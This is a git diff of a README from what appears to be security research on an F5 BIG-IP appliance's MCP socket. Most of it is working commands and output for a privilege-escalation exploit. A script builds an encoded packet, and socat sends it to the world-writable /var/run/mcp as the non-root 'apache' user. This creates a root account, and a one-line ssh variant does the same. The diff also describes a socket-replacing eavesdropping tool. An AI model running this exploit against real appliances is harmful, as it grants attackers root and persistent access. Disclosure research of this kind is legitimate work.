@@ -19,32 +19,49 @@ and you can find a bunch of different messages in
 I also created a builder, [mcp-builder.rb](/mcp-builder.rb), although it's not
 really designed to be easy to use. We do have a pre-defined function that
 creates an MCP packet that creates a root-level user account, which is pretty
-cool.
+cool. You can use `mcp-privesc.rb` to create that packet.
 
 # Building and Sending MCP Messages
 
-To communicate with MCP directly, you'll generally use `socat`. For example,
-we can use `mcp-builder.rb` to create a message (using `gzip` + `base64` for
-easier demos):
+To communicate with MCP directly, you'll generally use `socat`. The code in
+`mcp-builder.rb` can create packets (though currently only does privilege
+escalation via `mcp-privesc.rb`).
+
+To use `mcp-privesc.rb`, run it and find a way to send the output into a
+socket. You can provide optional username / password parameters as well. Here's
+an example where we gzip + base64-encode the output:
 
 ```
-$ ruby mcp-builder.rb | gzip - | base64 -w0
-H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxQ5KPA8gYCLGBaQ4ANbBwnA3tRfl5JanGJADtEowAHzJ5ox5ycWCDzBBZzDnALgukd3EJo5sifBAtwMLA55+fm5ucJxkPM5ZYEi3MzcOonZebpJyUWZ3CLgKUYuYXBUjkMWSpmKkVJJWZ5ocFB7s5VnlX5PhEqRUZ5vhk5RqY+5iZ5pUYm2aVJjvlVJYXBbklpiSlJZWaFeSmeeqa5roVRufph+oX6JXluejlB7pWpTnlZAcVFju4V5gbOKWnFZa76pZXhSb5uBYUFJfpgJyL7Kw/sHwYAd5yKZH8BAAA=
+$ ruby ./mcp-privesc.rb blogtest MyFunPW | gzip | base64 -w0
+Attempting to create a crypt-sha512 hash of the password
+Writing an `mcp` message to stdout that'll create an account: blogtest / $6$vdznqfyc$q9LEJmhlDZK3HQY0L0WuiKfXaKJtQmOY7lIkMS/IxftTmZs.PdlYXxmxjRQ4f529gl13NsqWlZdd/eksunJT01
+Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin
+
+H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxR5KPA8oYCLGBaU4ANbBwXA0dSTn56SWpxiQA7RKcAB8yiaMecnFgg8yAWg3ZyC4LpjdxC6AbJnwSLcDCwOefn5ubnCcZDDOaWBItzM3DqJ2Xm6SclFmdwi4ClGLmFwVIpDEkqZiplKVV5hWmVySqFlj6uXrkZOS5R3sYegZEGPgbhpZneaRGJ3l4lgbn+keY5ntm+wfqeFWklIblRxXoBKTmRERW5FVlBgSZppkaW6TmGxn7FheE5USkp+qnZxaV5XiEGhmCnIXsoD+wRBgAyeb1ueQEAAA==
 ```
 
-Then, on the host with `/var/run/mcp`, use socat to connect and save the
-response again as base64 (note: this can be any user account, since the socket
-is 0777):
+Then we can copy and paste it to the F5 BigIP target, and send it using this
+command (not that we're doing this as a non-root user as a demonstration):
 
 ```
-# echo -ne 'H4[...]A=' | base64 -d | gunzip - | socat -t100 - UNIX-CONNECT:/var/run/mcp | base64 -w0
-AAAAHgAAAAAAAAAAAAAAAAtUAA0AAAAWC1UABQAAAAALVwAMECgLWAAMECkAAAAAAB4AAAAAAAAAAAAAAAALVAANAAAAFgtVAAUAAAAAC1cADAtaC1gADAsRAAA=
+$ whoami
+apache
+
+$ echo -ne 'H4sIAAAAAAAAA2NgYBBnQAICGgy8QIpfQJOBH0izM7AmpuRm5oFkkJVx54CVcajaMbBChSxR5KPA8oYCLGBaU4ANbBwXA0dSTn56SWpxiQA7RKcAB8yiaMecnFgg8yAWg3ZyC4LpjdxC6AbJnwSLcDCwOefn5ubnCcZDDOaWBItzM3DqJ2Xm6SclFmdwi4ClGLmFwVIpDEkqZiplKVV5hWmVySqFlj6uXrkZOS5R3sYegZEGPgbhpZneaRGJ3l4lgbn+keY5ntm+wfqeFWklIblRxXoBKTmRERW5FVlBgSZppkaW6TmGxn7FheE5USkp+qnZxaV5XiEGhmCnIXsoD+wRBgAyeb1ueQEAAA==' | base64 -d | gunzip - | socat -t100 - UNIX-CONNECT:/var/run/mcp | gzip | base64 -w0
+H4sIAB91UGMAA2NgYJBjQALcIQy8QEqMO5SBFcwPZ+AR0OCOAJKaYAUEVXNHgVRzCzIwAABM8W1YXAAAAA==
+
+bash-4.2$ su blogtest
+Password: 
+[...]
+
+[blogtest@localhost:NO LICENSE:Standalone] config # whoami
+root
 ```
 
-And finally, we can parse that response:
+We can also parse the response we got using `mcp-parser.rb`:
 
 ```
-$ echo -ne 'AAAAHgAAAAAAAAAAAAAAAAtUAA0AAAAWC1UABQAAAAALVwAMECgLWAAMECkAAAAAAB4AAAAAAAAAAAAAAAALVAANAAAAFgtVAAUAAAAAC1cADAtaC1gADAsRAAA=' | base64 -d | ruby ./mcp-parser.rb 
+$ echo -ne 'H4sIAB91UGMAA2NgYJBjQALcIQy8QEqMO5SBFcwPZ+AR0OCOAJKaYAUEVXNHgVRzCzIwAABM8W1YXAAAAA==' | base64 -d | gunzip - | ruby ./mcp-parser.rb 
 result (structure [22 bytes]):
  result_code (ulong) = 0x00000000 (0)
  result_operation (tag) = user_authenticated
@@ -55,46 +72,38 @@ result (structure [22 bytes]):
  result_type (tag) = userdb_entry
 ```
 
-You can, of course, do it all as a single command:
+You can, of course, do it all as a single command, although that doesn't really make sense for our `privesc` command, considering we're already root:
 
 ```
-$ ruby mcp-builder.rb | ssh root@10.0.0.136 socat -t100 - UNIX-CONNECT:/var/run/mcp | ruby ./mcp-parser.rb 
+$ ruby ./mcp-privesc.rb blogtest2 MyFunPW | ssh root@10.0.0.162 socat -t100 - UNIX-CONNECT:/var/run/mcp | ruby ./mcp-parser.rb
+Attempting to create a crypt-sha512 hash of the password
+Writing an `mcp` message to stdout that'll create an account: blogtest2 / $6$dufuourf$gfuhZJZcXpfjcOTdyJdwsoLLX4EVwn7M9lDxk3LqDtj0PhwZS6Av2ua363xyzqNQFhVOWSiT3eYkInQN/aDkg.
+Send it to the target using: socat -t100 - UNIX-CONNECT:/var/run/mcp < mcpmessage.bin
+
 result (structure [22 bytes]):
  result_code (ulong) = 0x00000000 (0)
  result_operation (tag) = user_authenticated
  result_type (tag) = user_authenticated_name
-result (structure [96 bytes]):
- result_code (ulong) = 0x01020066 (16908390)
- result_message (string [78 bytes]) = "01020066:3: The requested user (rontest) already exists in partition Common."
+result (structure [22 bytes]):
+ result_code (ulong) = 0x00000000 (0)
+ result_operation (tag) = create
+ result_type (tag) = userdb_entry
+
+ron@fedora ~/shared/analysis/f5-big-ip-0day/analysis/mcp/parser [main]× $ ssh blogtest2@10.0.0.162
+(blogtest2@10.0.0.162) Password: 
+(blogtest2@10.0.0.162) You are required to change your password immediately (root enforced)
+[...]
+
+[blogtest2@localhost:NO LICENSE:Standalone] ~ # whoami
+root
 ```
 
-## Privesc
+# Connection Eavesdropping
 
-As of this writing, `/var/run/mcp` is world-writable and therefore any user can
-write to it! That means any user can add root users, which is a great thing to
-do after exploiting a service and getting a non-root shell.
-
-You can edit `mcp-builder.rb` to create whatever account you want, using
-sha512crypt-style password hashes:
-
-```
-  create_root_account_plz("username", '$6$hashedpassword')
-```
-
-Then send the output from that into `/var/run/mcp` and it should create you an
-account.
-
-If you just run the PoC (or use `escalationplz.bin`), you'll get a new user with
-the username `rontest` and the password `Password1`:
-
-```
-socat -t100 - UNIX-CONNECT:/var/run/mcp < escalationplz.bin
-```
-
-# Man in the Middle Inspection
-
-I also wrote a tool to inspect database queries - [mcp-mitm.rb](/mcp-mitm.rb).
-This isn't an exploit, it's just an analysis tool.
+I also wrote a tool to inspect/log database queries in real time -
+[mcp-mitm.rb](/mcp-mitm.rb). This isn't an exploit, it's just an analysis tool
+that requires a root login. Effectively, it moves `/var/run/mcp` and replaces
+it with a socket that we control, then parses all the messages going through it.
 
 To run it:
 
